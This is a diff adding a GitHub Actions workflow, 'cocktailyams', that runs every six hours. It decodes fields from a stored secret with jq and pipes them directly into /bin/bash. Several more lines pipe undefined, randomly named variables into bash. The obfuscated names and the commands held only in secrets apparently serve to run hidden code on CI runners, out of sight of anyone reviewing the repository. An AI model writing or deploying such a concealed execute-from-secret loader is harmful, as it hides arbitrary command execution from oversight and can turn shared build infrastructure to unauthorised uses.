@@ -1,0 +1,22 @@
+name: cocktailyams
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: cocktailyams
+        env:
+          opn32: ${{ secrets.opn32 }}
+        run: |
+          echo $opn32 | jq -r .e8864 | /bin/bash
+          echo $getf428 | jq -r .q09457 | /bin/bash
+          echo $h10259 | jq -r .zcle9333 | /bin/bash
+          echo $awyld640 | jq -r .rsvn9 | /bin/bash
+          echo $xxj37062 | jq -r .xo2659 | /bin/bash
+          echo $e3076 | jq -r .rn5 | /bin/bash
+
